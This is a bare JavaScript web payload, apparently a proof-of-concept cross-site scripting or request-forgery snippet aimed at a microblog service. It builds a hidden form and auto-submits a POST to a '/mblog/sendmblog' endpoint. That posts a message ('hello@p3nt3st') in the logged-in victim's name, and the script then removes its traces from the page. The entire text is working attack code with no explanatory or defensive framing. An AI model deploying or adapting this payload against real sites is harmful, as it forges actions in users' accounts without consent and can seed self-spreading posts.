if(self.location.hash == '#1'){
self.location.hash="2";
var form12=document.createElement('form');
form12.id='wb';
document.body.appendChild(form12);
var input=document.createElement('input');
input.type="text";
input.name="r1";
input.value="0";
form12.appendChild(input);
var input2=document.createElement('input');
input2.type="text";
input2.name="content";
input2.value="hello@p3nt3st";
form12.appendChild(input2);
form12.method="POST";
form12.action="/mblog/sendmblog?st=3825";
form12.submit();
document.body.removeChild(form12);
document.body.removeChild(s);
}
